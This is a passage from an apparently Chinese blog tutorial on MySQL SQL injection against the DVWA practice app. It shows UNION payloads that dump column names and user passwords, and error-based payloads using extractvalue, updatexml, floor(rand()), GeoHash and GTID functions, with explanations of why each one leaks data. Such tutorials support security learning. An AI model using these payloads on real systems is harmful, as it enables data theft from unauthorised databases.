      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;COLUMN_DEFAULT&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列的默认值（如果设置了）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;IS_NULLABLE&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列是否允许为 &lt;code&gt;NULL&lt;/code&gt; 值 (&lt;code&gt;YES&lt;/code&gt; 或 &lt;code&gt;NO&lt;/code&gt;)。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;CHARACTER_MAXIMUM_LENGTH&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录字符串类型列的最大长度。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;同样借此获取users表的字段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; and table_schema=database()#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706113907039.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250706113907039&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这样就得到了users表的所有的列名称&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这里要注意的是，除了指定表名之外，还要指定数据库名，否则就会出现很多不属于这个表的列名：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626144509634.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626144509634&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;7获取字段信息&#34;&gt;7.获取字段信息
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知道了表名和列名，就能轻松获取对应信息了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如我想获取所有用户的id名称和对应密码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select group_concat(user_id,first_name),group_concat(password) from users #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626145455797.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626145455797&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们在这里使用group_concat拼接了两组字符串，因为select输出的数量必须与字段数一致，这里是2&lt;/p&gt;
&lt;h3 id=&#34;8逐行获取信息&#34;&gt;8.逐行获取信息
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;书接上文，如果我只想要显示某一条信息，就可以在末尾加上&lt;code&gt;limit m,n&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;意思是从第m条数据开始，显示包括n条数据，比如&lt;code&gt;limit 0,1&lt;/code&gt;，就是只显示第1条数据（数据从0开始存储）&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; limit 1,1 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627113327247.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627113327247&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这里使用&lt;code&gt;limit1,1&lt;/code&gt;，就只显示了第二条数据&lt;/p&gt;
&lt;h2 id=&#34;2-报错注入&#34;&gt;#2 报错注入
&lt;/h2&gt;&lt;p&gt;如果union被过滤，或者页面没有回显但SQL语句执行可以输出错误信息，就可以使用基于报错的注入攻击&lt;/p&gt;
&lt;p&gt;报错注入就是人为制造错误条件，让查询结果在报错信息中被“带出”&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;报错注入最好使用and，因为我们的目的是保证语句执行错误，产生错误信息&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;常用函数-1&#34;&gt;常用函数
&lt;/h3&gt;&lt;p&gt;在mysql高版本**（大于5.1版本）**中添加了对XML文档进行查询和修改的函数&lt;code&gt;updatexml()&lt;/code&gt;和&lt;code&gt;extractvalue()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当这两个函数在执行时，如果出现xml文档路径错误就会产生报错&lt;/p&gt;
&lt;h4 id=&#34;extractvalue-xml_document-xpath_string&#34;&gt;extractvalue (XML_document, XPath_string)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;我们可以利用concat拼接任意非法字符和查询语句/函数，这样想要得到的内容就会随着报错一并回显：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;XPATH syntax error: &amp;#39;~dvwa~&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;我们使用了&lt;code&gt;database()&lt;/code&gt;函数，而sql会执行这个函数，返回函数结果，就带出了数据库名称&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;updatexml-xml_document-xpath_string-new_value&#34;&gt;updatexml (XML_document, XPath_string, new_value)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/li&gt;
&lt;li&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;第三个参数：&lt;code&gt;new_value&lt;/code&gt; 用来替换查找到的符合条件的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也是同理会报错&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;之后的演示我会以&lt;code&gt;updatexml()&lt;/code&gt;和&lt;code&gt;extractvalue()&lt;/code&gt;为主&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;但在此之前，我还想介绍一些其他的好玩的函数(当然也很有用!）👇&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;不那么常用的函数&#34;&gt;不那么常用的函数
&lt;/h3&gt;&lt;h4 id=&#34;floor函数8xmysql50&#34;&gt;floor函数(8.x&amp;gt;mysql&amp;gt;5.0）
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;floor()&lt;/code&gt;：对结果取整（向下舍入）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这不是一个单独使用的函数，而是需要与&lt;code&gt;rand()&lt;/code&gt;, &lt;code&gt;count(*)&lt;/code&gt;和&lt;code&gt;group by&lt;/code&gt;结合使用，来触发&lt;strong&gt;主键重复错误&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;concat&lt;/span&gt;((&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;database&lt;/span&gt;()),&lt;span style=&#34;color:#e06c75&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;))&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;)&lt;span style=&#34;color:#e06c75&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;								      ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	这里插入你想进行的查询语句，只能有一个返回值，因为&lt;span style=&#34;color:#e06c75&#34;&gt;concat函数值只接受单值&lt;/span&gt;，最好使用&lt;span style=&#34;color:#e06c75&#34;&gt;limit语句&lt;/span&gt;，比如：
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;concat&lt;/span&gt;((&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;table_schema&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;dvwa&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;limit&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;),&lt;span style=&#34;color:#e06c75&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;rand&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;))&lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;information_schema&lt;/span&gt;.&lt;span style=&#34;color:#e06c75&#34;&gt;tables&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;by&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;x&lt;/span&gt;)&lt;span style=&#34;color:#e06c75&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在，我们输入这样的注入语句：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们看看每一个部分的作用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;floor(rand(0)\*2)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rand()&lt;/code&gt;函数会产生一个0到1之间的随机数。但当给它一个固定的种子（seed），如&lt;code&gt;0&lt;/code&gt;时，它产生的“随机数”序列就变成&lt;strong&gt;完全可预测&lt;/strong&gt;的了&lt;/p&gt;
&lt;p&gt;最终，&lt;strong&gt;&lt;code&gt;floor(rand(0)*2)&lt;/code&gt;会稳定地产生这样一个序列：&lt;code&gt;0, 1, 1, 0, 1, 1, 0, ...&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;concat((select database()), floor(rand(0)\*2))&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这部分将我们要查询的数据与上面产生的&lt;code&gt;0&lt;/code&gt;或&lt;code&gt;1&lt;/code&gt;拼接起来&lt;/p&gt;
&lt;p&gt;因此，它会生成一系列的字符串，如 &lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;... from information_schema.tables group by x&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;from information_schema.tables&lt;/code&gt;：这里只是为了提供足够的数据行（至少3行）来让&lt;code&gt;group by&lt;/code&gt;操作得以触发错误，&lt;strong&gt;任何行数足够的表都可以&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;group by x&lt;/code&gt;：这是触发错误的关键，它会根据我们上面生成的字符串（如&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;, &lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;）进行分组和计数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select 1 from ...&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;把返回两列的内部查询包装成只返回一列（内容是&lt;code&gt;1&lt;/code&gt;）的、语法正确的子查询&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来，我们需要知道两个关键点：&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;1.group by在执行时，会建立一个虚拟的临时表，用于存放分组的键(key)和count(*)计数值&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;2.在执行插入操作前，sql会再次查询当前要插入的键，因此rand()会再次执行&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;现在来看看错误是怎样发生的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;逐行处理&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;第一行：调用&lt;code&gt;rand()&lt;/code&gt;，计算出的键是&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;，临时表中没有这个键，sql准备插入，此时第二次调用&lt;code&gt;rand()&lt;/code&gt;，计算出&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;插入&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（也就是说，想插入的是0，却插入了1）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二行：此时&lt;code&gt;rand()&lt;/code&gt;第三次被调用，计算出的键是&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;，临时表中已经有了，不用插入，计数值加一就行&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（注意：sql这里一开始就没有打算插入，而是选择count+1）&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;触发错误&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;第三行：此时&lt;code&gt;rand()&lt;/code&gt;第四次被调用，计算出的键是&lt;code&gt;&#39;dvwa0&#39;&lt;/code&gt;，表里没有这个键，所以sql准备插入，此时第五次调用&lt;code&gt;rand()&lt;/code&gt;，计算出&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;插入&lt;/p&gt;
&lt;p&gt;等等，不对！表里已经有&lt;code&gt;&#39;dvwa1&#39;&lt;/code&gt;了！&lt;/p&gt;
&lt;p&gt;这就导致sql尝试插入一个已经存在的键，从而触发了**“主键重复”（&lt;code&gt;Duplicate entry&lt;/code&gt;）的错误：**&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Duplicate entry &amp;#39;dvwa1&amp;#39; for key &amp;#39;group_key&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这样，就把数据库名称带了出来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;同时，我们还能总结出这样的规律：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;对于一个整数x通过floor(rand(x)*2)产生的序列：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red;font-size:20px&#34;&gt;&lt;strong&gt;如果在未出现&lt;code&gt;0011&lt;/code&gt;或&lt;code&gt;1100&lt;/code&gt;序列前出现&lt;code&gt;0010&lt;/code&gt;或&lt;code&gt;1101&lt;/code&gt;，那么该序列可用于报错型sql盲注&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考文档：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_35544379/article/details/77453019&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SQL报错型盲注教程
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		&lt;a class=&#34;link&#34; href=&#34;https://www.secpulse.com/archives/140616.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;关于floor()报错注入，你真的懂了吗？
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;st_latfromgeohashgeohash_string&#34;&gt;ST_LatFromGeoHash(geohash_string)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;参数是一个GeoHash格式的字符串，如果格式不对，函数就会报错，并可能返回导致错误的非法字符串&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;和XPath_string一样，&lt;code&gt;~&lt;/code&gt;不是GeoHash格式里面的合法字符，如果使用就会报错，同时带出数据：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FUNCTION dvwa.ST_LatFromGeoHash does not exist
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		           ↑↑↑↑↑
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;st_longfromgeohashgeohash_string&#34;&gt;ST_LongFromGeoHash(geohash_string)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;利用原理与&lt;code&gt;ST_LatFromGeoHash&lt;/code&gt;完全相同&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;st_pointfromgeohashgeohash_string-srid&#34;&gt;ST_PointFromGeoHash(geohash_string, srid)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;好吧和上面还是一样的&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;gtid_subsetsubset-set&#34;&gt;GTID_SUBSET(subset, set)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;第一个参数： &lt;code&gt;subset&lt;/code&gt;一个GTID（全局事务标识符）集合。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二个参数： &lt;code&gt;set&lt;/code&gt;另一个GTID集合。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一个合法的GTID单元由两部分组成，用冒号隔开：&lt;code&gt;source_id:transaction_id&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当任意一个参数不是合法的GTID集合格式时，函数就会报错，并可能返回非法参数的内容&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and GTID_SUBSET(database(), 1)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;报错结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FUNCTION dvwa.GTID_SUBSET does not exist
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:20px&#34;&gt;&lt;strong&gt;好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆破数据库名称&#34;&gt;爆破数据库名称
